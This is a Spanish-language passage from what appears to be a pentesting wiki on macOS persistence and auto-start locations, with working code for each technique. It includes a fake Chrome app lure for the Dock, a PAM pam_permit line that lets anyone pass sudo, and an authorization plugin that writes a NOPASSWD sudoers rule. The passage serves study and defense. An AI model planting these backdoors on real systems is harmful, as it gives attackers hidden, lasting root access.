El nombre del archivo contiene la cola, el número de trabajo y la hora programada para ejecutarse. Por ejemplo, echemos un vistazo a `a0001a019bdcd2`.

- `a` - esta es la cola
- `0001a` - número de trabajo en hex, `0x1a = 26`
- `019bdcd2` - tiempo en hex. Representa los minutos transcurridos desde la época. `0x019bdcd2` es `26991826` en decimal. Si lo multiplicamos por 60, obtenemos `1619509560`, que es `GMT: 2021. Abril 27., Martes 7:46:00`.

Si imprimimos el archivo de trabajo, encontramos que contiene la misma información que obtuvimos usando `at -c`.

### Acciones de Carpeta

Escritura: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Escritura: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero necesitas poder llamar a `osascript` con argumentos para contactar a **`System Events`** y poder configurar las Acciones de Carpeta
- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
- Tiene algunos permisos básicos de TCC como Escritorio, Documentos y Descargas

#### Ubicación

- **`/Library/Scripts/Folder Action Scripts`**
- Se requiere root
- **Disparador**: Acceso a la carpeta especificada
- **`~/Library/Scripts/Folder Action Scripts`**
- **Disparador**: Acceso a la carpeta especificada

#### Descripción y Explotación

Las Acciones de Carpeta son scripts que se activan automáticamente por cambios en una carpeta, como agregar, eliminar elementos u otras acciones como abrir o redimensionar la ventana de la carpeta. Estas acciones se pueden utilizar para diversas tareas y se pueden activar de diferentes maneras, como usando la interfaz de Finder o comandos de terminal.

Para configurar las Acciones de Carpeta, tienes opciones como:

1. Crear un flujo de trabajo de Acción de Carpeta con [Automator](https://support.apple.com/guide/automator/welcome/mac) e instalarlo como un servicio.
2. Adjuntar un script manualmente a través de la Configuración de Acciones de Carpeta en el menú contextual de una carpeta.
3. Utilizar OSAScript para enviar mensajes de Apple Event a `System Events.app` para configurar programáticamente una Acción de Carpeta.
- Este método es particularmente útil para incrustar la acción en el sistema, ofreciendo un nivel de persistencia.

El siguiente script es un ejemplo de lo que se puede ejecutar mediante una Acción de Carpeta:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Para hacer que el script anterior sea utilizable por Folder Actions, compílalo usando:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Después de que el script esté compilado, configura las Acciones de Carpeta ejecutando el script a continuación. Este script habilitará las Acciones de Carpeta globalmente y adjuntará específicamente el script previamente compilado a la carpeta de Escritorio.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Ejecuta el script de configuración con:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Esta es la forma de implementar esta persistencia a través de la GUI:

Este es el script que se ejecutará:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Compílalo con: `osacompile -l JavaScript -o folder.scpt source.js`

Muévelo a:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Luego, abre la aplicación `Folder Actions Setup`, selecciona la **carpeta que te gustaría vigilar** y selecciona en tu caso **`folder.scpt`** (en mi caso lo llamé output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Ahora, si abres esa carpeta con **Finder**, tu script se ejecutará.

Esta configuración se almacenó en el **plist** ubicado en **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** en formato base64.

Ahora, intentemos preparar esta persistencia sin acceso a la GUI:

1. **Copia `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** a `/tmp` para hacer una copia de seguridad:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Elimina** las Acciones de Carpeta que acabas de configurar:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Ahora que tenemos un entorno vacío

3. Copia el archivo de respaldo: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Abre la aplicación Folder Actions Setup.app para consumir esta configuración: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Y esto no funcionó para mí, pero esas son las instrucciones del informe:(

### Accesos directos del Dock

Informe: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Útil para eludir el sandbox: [✅](https://emojipedia.org/check-mark-button)
- Pero necesitas tener instalada una aplicación maliciosa dentro del sistema
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `~/Library/Preferences/com.apple.dock.plist`
- **Disparador**: Cuando el usuario hace clic en la aplicación dentro del dock

#### Descripción y Explotación

Todas las aplicaciones que aparecen en el Dock están especificadas dentro del plist: **`~/Library/Preferences/com.apple.dock.plist`**

Es posible **agregar una aplicación** solo con:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Usando algo de **ingeniería social** podrías **suplantar, por ejemplo, Google Chrome** dentro del dock y realmente ejecutar tu propio script:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Seleccionadores de Color

Escritura: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Se necesita que ocurra una acción muy específica
- Terminarás en otro sandbox
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `/Library/ColorPickers`
- Se requiere acceso root
- Activador: Usa el seleccionador de color
- `~/Library/ColorPickers`
- Activador: Usa el seleccionador de color

#### Descripción y Explotación

**Compila un** bundle **de seleccionador de color** con tu código (podrías usar [**este, por ejemplo**](https://github.com/viktorstrate/color-picker-plus)) y añade un constructor (como en la [sección de Protector de Pantalla](macos-auto-start-locations.md#screen-saver)) y copia el bundle a `~/Library/ColorPickers`.

Luego, cuando se active el seleccionador de color, tu código también debería activarse.

Ten en cuenta que el binario que carga tu biblioteca tiene un **sandbox muy restrictivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Escritura**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Escritura**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Útil para eludir sandbox: **No, porque necesitas ejecutar tu propia aplicación**
- Bypass de TCC: ???

#### Ubicación

- Una aplicación específica

#### Descripción y Explotación

Un ejemplo de aplicación con una Extensión de Finder Sync [**se puede encontrar aquí**](https://github.com/D00MFist/InSync).

Las aplicaciones pueden tener `Finder Sync Extensions`. Esta extensión irá dentro de una aplicación que será ejecutada. Además, para que la extensión pueda ejecutar su código, **debe estar firmada** con algún certificado de desarrollador de Apple válido, debe estar **sandboxed** (aunque se podrían agregar excepciones relajadas) y debe estar registrada con algo como:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Protector de Pantalla

Escritura: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Escritura: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero terminarás en un sandbox de aplicación común
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `/System/Library/Screen Savers`
- Se requiere root
- **Disparador**: Selecciona el protector de pantalla
- `/Library/Screen Savers`
- Se requiere root
- **Disparador**: Selecciona el protector de pantalla
- `~/Library/Screen Savers`
- **Disparador**: Selecciona el protector de pantalla

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descripción y Explotación

Crea un nuevo proyecto en Xcode y selecciona la plantilla para generar un nuevo **Protector de Pantalla**. Luego, agrega tu código a él, por ejemplo, el siguiente código para generar registros.

**Compílalo**, y copia el paquete `.saver` a **`~/Library/Screen Savers`**. Luego, abre la GUI del Protector de Pantalla y si simplemente haces clic en él, debería generar muchos registros:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Tenga en cuenta que debido a que dentro de los derechos del binario que carga este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) puede encontrar **`com.apple.security.app-sandbox`** estará **dentro del sandbox de aplicaciones común**.

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Útil para eludir la sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero terminarás en una sandbox de aplicación
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
- La sandbox parece muy limitada

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Se crea un nuevo archivo con una extensión gestionada por el plugin de spotlight.
- `/Library/Spotlight/`
- **Trigger**: Se crea un nuevo archivo con una extensión gestionada por el plugin de spotlight.
- Se requiere root
- `/System/Library/Spotlight/`
- **Trigger**: Se crea un nuevo archivo con una extensión gestionada por el plugin de spotlight.
- Se requiere root
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Se crea un nuevo archivo con una extensión gestionada por el plugin de spotlight.
- Se requiere una nueva app

#### Description & Exploitation

Spotlight es la función de búsqueda integrada de macOS, diseñada para proporcionar a los usuarios **acceso rápido y completo a los datos en sus computadoras**.\
Para facilitar esta capacidad de búsqueda rápida, Spotlight mantiene una **base de datos propietaria** y crea un índice mediante **el análisis de la mayoría de los archivos**, lo que permite búsquedas rápidas a través de nombres de archivos y su contenido.

El mecanismo subyacente de Spotlight implica un proceso central llamado 'mds', que significa **'servidor de metadatos'.** Este proceso orquesta todo el servicio de Spotlight. Complementando esto, hay múltiples demonios 'mdworker' que realizan una variedad de tareas de mantenimiento, como indexar diferentes tipos de archivos (`ps -ef | grep mdworker`). Estas tareas son posibles gracias a los plugins importadores de Spotlight, o **".mdimporter bundles**", que permiten a Spotlight entender e indexar contenido a través de una amplia gama de formatos de archivo.

Los plugins o **`.mdimporter`** bundles se encuentran en los lugares mencionados anteriormente y si aparece un nuevo bundle, se carga en un minuto (no es necesario reiniciar ningún servicio). Estos bundles deben indicar qué **tipo de archivo y extensiones pueden gestionar**, de esta manera, Spotlight los utilizará cuando se cree un nuevo archivo con la extensión indicada.

Es posible **encontrar todos los `mdimporters`** cargados ejecutando:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Y, por ejemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** se utiliza para analizar este tipo de archivos (extensiones `.iba` y `.book`, entre otros):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Si revisas el Plist de otros `mdimporter`, es posible que no encuentres la entrada **`UTTypeConformsTo`**. Eso se debe a que es un _Identificador de Tipo Uniforme_ ([_UTI_](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) incorporado y no necesita especificar extensiones.
>
> Además, los plugins predeterminados del sistema siempre tienen prioridad, por lo que un atacante solo puede acceder a archivos que no están indexados por los propios `mdimporters` de Apple.

Para crear tu propio importador, podrías comenzar con este proyecto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) y luego cambiar el nombre, el **`CFBundleDocumentTypes`** y agregar **`UTImportedTypeDeclarations`** para que soporte la extensión que te gustaría soportar y reflejarlas en **`schema.xml`**.\
Luego **cambia** el código de la función **`GetMetadataForFile`** para ejecutar tu payload cuando se crea un archivo con la extensión procesada.

Finalmente **construye y copia tu nuevo `.mdimporter`** a una de las ubicaciones anteriores y puedes verificar si se carga **monitoreando los logs** o revisando **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> No parece que esto esté funcionando más.

Escritura: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Necesita una acción específica del usuario
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Descripción

No parece que esto esté funcionando más.

## Bypass de Sandbox de Root

> [!TIP]
> Aquí puedes encontrar ubicaciones de inicio útiles para el **bypass de sandbox** que te permite simplemente ejecutar algo **escribiéndolo en un archivo** siendo **root** y/o requiriendo otras **condiciones extrañas.**

### Periódico

Escritura: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Útil para eludir el sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Se requiere root
- **Disparador**: Cuando llegue el momento
- `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`
- Se requiere root
- **Disparador**: Cuando llegue el momento

#### Descripción y Explotación

Los scripts periódicos (**`/etc/periodic`**) se ejecutan debido a los **daemons de lanzamiento** configurados en `/System/Library/LaunchDaemons/com.apple.periodic*`. Ten en cuenta que los scripts almacenados en `/etc/periodic/` son **ejecutados** como el **propietario del archivo**, por lo que esto no funcionará para una posible escalada de privilegios.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Hay otros scripts periódicos que se ejecutarán indicados en **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Si logras escribir cualquiera de los archivos `/etc/daily.local`, `/etc/weekly.local` o `/etc/monthly.local`, será **ejecutado tarde o temprano**.

> [!WARNING]
> Ten en cuenta que el script periódico será **ejecutado como el propietario del script**. Así que si un usuario regular es el propietario del script, se ejecutará como ese usuario (esto podría prevenir ataques de escalada de privilegios).

### PAM

Escritura: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Escritura: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Útil para eludir sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Root siempre requerido

#### Descripción y Explotación

Como PAM se centra más en la **persistencia** y malware que en la ejecución fácil dentro de macOS, este blog no dará una explicación detallada, **lee las escrituras para entender mejor esta técnica**.

Verifica los módulos de PAM con:
```bash
ls -l /etc/pam.d
```
Una técnica de persistencia/escalada de privilegios que abusa de PAM es tan fácil como modificar el módulo /etc/pam.d/sudo añadiendo al principio la línea:
```bash
auth       sufficient     pam_permit.so
```
Así que se verá algo así:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Y, por lo tanto, cualquier intento de usar **`sudo` funcionará**.

> [!CAUTION]
> Tenga en cuenta que este directorio está protegido por TCC, por lo que es muy probable que el usuario reciba un aviso pidiendo acceso.

Otro buen ejemplo es su, donde se puede ver que también es posible dar parámetros a los módulos PAM (y también podría poner una puerta trasera en este archivo):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Útil para eludir sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root y hacer configuraciones adicionales
- Bypass de TCC: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- Se requiere root
- También es necesario configurar la base de datos de autorización para usar el plugin

#### Description & Exploitation

Puedes crear un plugin de autorización que se ejecutará cuando un usuario inicie sesión para mantener la persistencia. Para más información sobre cómo crear uno de estos plugins, consulta los writeups anteriores (y ten cuidado, uno mal escrito puede bloquearte y necesitarás limpiar tu mac desde el modo de recuperación).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Mueva** el paquete a la ubicación para ser cargado:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Finalmente, agrega la **regla** para cargar este Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
El **`evaluate-mechanisms`** le dirá al marco de autorización que necesitará **llamar a un mecanismo externo para la autorización**. Además, **`privileged`** hará que se ejecute como root.

Actívelo con:
```bash
security authorize com.asdf.asdf
```
Y luego el **grupo de personal debe tener** acceso sudo (lee `/etc/sudoers` para confirmar).

### Man.conf

Escritura: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Útil para eludir sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root y el usuario debe usar man
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/private/etc/man.conf`**
- Se requiere root
- **`/private/etc/man.conf`**: Siempre que se use man

#### Descripción y Explotación

El archivo de configuración **`/private/etc/man.conf`** indica el binario/script a usar al abrir archivos de documentación de man. Por lo tanto, la ruta al ejecutable podría ser modificada para que cada vez que el usuario use man para leer algunos documentos, se ejecute una puerta trasera.

Por ejemplo, configurado en **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Y luego crea `/tmp/view` como:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Escritura**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Útil para eludir sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root y apache debe estar en ejecución
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)
- Httpd no tiene derechos

#### Ubicación

- **`/etc/apache2/httpd.conf`**
- Se requiere root
- Activador: Cuando Apache2 se inicia

#### Descripción y Explotación

Puedes indicar en `/etc/apache2/httpd.conf` que cargue un módulo añadiendo una línea como:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
De esta manera, tu módulo compilado será cargado por Apache. Lo único es que necesitas **firmarlo con un certificado de Apple válido**, o necesitas **agregar un nuevo certificado de confianza** en el sistema y **firmarlo** con él.

Luego, si es necesario, para asegurarte de que el servidor se inicie, podrías ejecutar:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Ejemplo de código para el Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Marco de auditoría BSM

Escritura: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Útil para eludir sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Pero necesitas ser root, auditd debe estar en ejecución y causar una advertencia
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- **`/etc/security/audit_warn`**
- Se requiere root
- **Activador**: Cuando auditd detecta una advertencia

#### Descripción y Explotación

Siempre que auditd detecta una advertencia, el script **`/etc/security/audit_warn`** es **ejecutado**. Así que podrías agregar tu payload en él.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Podrías forzar una advertencia con `sudo audit -n`.

### Elementos de Inicio

> [!CAUTION] > **Esto está obsoleto, por lo que no debería encontrarse nada en esos directorios.**

El **StartupItem** es un directorio que debe estar ubicado dentro de `/Library/StartupItems/` o `/System/Library/StartupItems/`. Una vez que se establece este directorio, debe contener dos archivos específicos:

1. Un **script rc**: Un script de shell ejecutado al inicio.
2. Un **archivo plist**, específicamente llamado `StartupParameters.plist`, que contiene varias configuraciones.

Asegúrate de que tanto el script rc como el archivo `StartupParameters.plist` estén correctamente ubicados dentro del directorio **StartupItem** para que el proceso de inicio los reconozca y los utilice.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> No puedo encontrar este componente en mi macOS, así que para más información consulta el writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introducido por Apple, **emond** es un mecanismo de registro que parece estar subdesarrollado o posiblemente abandonado, sin embargo, sigue siendo accesible. Aunque no es particularmente beneficioso para un administrador de Mac, este servicio oscuro podría servir como un método sutil de persistencia para actores de amenazas, probablemente no notado por la mayoría de los administradores de macOS.

Para aquellos que son conscientes de su existencia, identificar cualquier uso malicioso de **emond** es sencillo. El LaunchDaemon del sistema para este servicio busca scripts para ejecutar en un solo directorio. Para inspeccionar esto, se puede usar el siguiente comando:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

